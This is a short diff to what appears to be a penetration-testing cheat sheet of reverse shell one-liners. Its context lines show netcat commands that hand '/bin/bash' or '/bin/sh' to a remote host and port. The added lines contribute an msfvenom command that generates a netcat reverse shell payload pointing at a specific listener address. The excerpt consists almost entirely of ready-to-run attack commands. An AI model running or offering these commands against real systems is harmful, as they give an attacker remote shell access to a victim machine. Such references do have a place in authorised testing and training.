@@ -34,6 +34,10 @@ nc -u -lvp 4242
 * Netcat :
   * `nc -e /bin/bash 10.0.0.1 1234`
   * `nc -c /bin/sh 10.0.0.1 1234`
+  * `Reverse shell command without quotes` 
+    * `msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.137.141 LPORT=8888 R`
+
+![](../../.gitbook/assets/image%20%2887%29.png)
 
 ## PHP
 
